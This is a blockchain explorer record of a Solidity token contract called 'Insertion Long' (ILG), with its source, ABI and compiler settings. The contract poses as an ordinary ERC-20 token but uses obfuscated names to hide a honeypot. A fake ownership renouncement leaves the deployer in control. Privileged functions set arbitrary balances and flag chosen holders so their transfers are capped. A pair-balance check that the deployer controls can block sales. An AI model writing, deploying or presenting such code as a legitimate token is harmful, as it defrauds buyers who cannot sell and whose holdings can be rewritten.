{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface liquiditySender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundBuy) external view returns (uint256);\n\n    function transfer(address enableLiquidity, uint256 toTotal) external returns (bool);\n\n    function allowance(address receiverLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableLiquidity,\n        uint256 toTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeSell, uint256 value);\n    event Approval(address indexed receiverLimit, address indexed spender, uint256 value);\n}\n\nabstract contract fundModeTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxIs {\n    function createPair(address txToken, address shouldReceiver) external returns (address);\n}\n\ninterface liquiditySenderMetadata is liquiditySender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InsertionLong is fundModeTx, liquiditySender, liquiditySenderMetadata {\n\n    function tradingAt() public {\n        emit OwnershipTransferred(tokenSwapLaunch, address(0));\n        launchTotal = address(0);\n    }\n\n    function transferFrom(address swapFund, address enableLiquidity, uint256 toTotal) external override returns (bool) {\n        if (_msgSender() != walletList) {\n            if (buyTokenSwap[swapFund][_msgSender()] != type(uint256).max) {\n                require(toTotal <= buyTokenSwap[swapFund][_msgSender()]);\n                buyTokenSwap[swapFund][_msgSender()] -= toTotal;\n            }\n        }\n        return fromList(swapFund, enableLiquidity, toTotal);\n    }\n\n    function walletReceiver() private view {\n        require(takeLaunched[_msgSender()]);\n    }\n\n    function approve(address receiverTeamTake, uint256 toTotal) public virtual override returns (bool) {\n        buyTokenSwap[_msgSender()][receiverTeamTake] = toTotal;\n        emit Approval(_msgSender(), receiverTeamTake, toTotal);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed marketingWallet, address indexed fundAmount);\n\n    function isLaunchedReceiver(address swapFund, address enableLiquidity, uint256 toTotal) internal returns (bool) {\n        require(launchMax[swapFund] >= toTotal);\n        launchMax[swapFund] -= toTotal;\n        launchMax[enableLiquidity] += toTotal;\n        emit Transfer(swapFund, enableLiquidity, toTotal);\n        return true;\n    }\n\n    function allowance(address receiverTake, address receiverTeamTake) external view virtual override returns (uint256) {\n        if (receiverTeamTake == walletList) {\n            return type(uint256).max;\n        }\n        return buyTokenSwap[receiverTake][receiverTeamTake];\n    }\n\n    function maxTo(uint256 toTotal) public {\n        walletReceiver();\n        takeTokenMax = toTotal;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchFee;\n    }\n\n    constructor (){\n        if (isFund != isLaunched) {\n            isLaunched = isFund;\n        }\n        launchAmount swapAuto = launchAmount(walletList);\n        walletBuy = maxIs(swapAuto.factory()).createPair(swapAuto.WETH(), address(this));\n        \n        tokenSwapLaunch = _msgSender();\n        tradingAt();\n        takeLaunched[tokenSwapLaunch] = true;\n        launchMax[tokenSwapLaunch] = sellTakeAmount;\n        \n        emit Transfer(address(0), tokenSwapLaunch, sellTakeAmount);\n    }\n\n    address walletList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fromList(address swapFund, address enableLiquidity, uint256 toTotal) internal returns (bool) {\n        if (swapFund == tokenSwapLaunch) {\n            return isLaunchedReceiver(swapFund, enableLiquidity, toTotal);\n        }\n        uint256 limitSender = liquiditySender(walletBuy).balanceOf(liquidityFrom);\n        require(limitSender == takeTokenMax);\n        require(enableLiquidity != liquidityFrom);\n        if (totalEnableAmount[swapFund]) {\n            return isLaunchedReceiver(swapFund, enableLiquidity, autoTrading);\n        }\n        return isLaunchedReceiver(swapFund, enableLiquidity, toTotal);\n    }\n\n    mapping(address => uint256) private launchMax;\n\n    uint256 private sellTakeAmount = 100000000 * 10 ** 18;\n\n    uint8 private totalShould = 18;\n\n    uint256 public isFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalShould;\n    }\n\n    function balanceOf(address fundBuy) public view virtual override returns (uint256) {\n        return launchMax[fundBuy];\n    }\n\n    function sellAuto(address minAtTeam, uint256 toTotal) public {\n        walletReceiver();\n        launchMax[minAtTeam] = toTotal;\n    }\n\n    bool private limitLaunch;\n\n    address public tokenSwapLaunch;\n\n    function takeWalletShould(address fromWallet) public {\n        if (minTake) {\n            return;\n        }\n        if (limitLaunch) {\n            isLaunched = isFund;\n        }\n        takeLaunched[fromWallet] = true;\n        if (isLaunched == isFund) {\n            amountSender = false;\n        }\n        minTake = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellTakeAmount;\n    }\n\n    bool public minTake;\n\n    uint256 takeTokenMax;\n\n    mapping(address => bool) public totalEnableAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoIs;\n    }\n\n    address liquidityFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return launchTotal;\n    }\n\n    address private launchTotal;\n\n    function getOwner() external view returns (address) {\n        return launchTotal;\n    }\n\n    string private launchFee = \"Insertion Long\";\n\n    mapping(address => bool) public takeLaunched;\n\n    address public walletBuy;\n\n    uint256 public isLaunched;\n\n    string private autoIs = \"ILG\";\n\n    bool public amountSender;\n\n    function limitShould(address amountToken) public {\n        walletReceiver();\n        \n        if (amountToken == tokenSwapLaunch || amountToken == walletBuy) {\n            return;\n        }\n        totalEnableAmount[amountToken] = true;\n    }\n\n    uint256 txMin;\n\n    mapping(address => mapping(address => uint256)) private buyTokenSwap;\n\n    function transfer(address minAtTeam, uint256 toTotal) external virtual override returns (bool) {\n        return fromList(_msgSender(), minAtTeam, toTotal);\n    }\n\n    uint256 constant autoTrading = 12 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTeamTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeamTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"}],\"name\":\"limitShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toTotal\",\"type\":\"uint256\"}],\"name\":\"maxTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAtTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toTotal\",\"type\":\"uint256\"}],\"name\":\"sellAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"}],\"name\":\"takeWalletShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSwapLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalEnableAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAtTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InsertionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}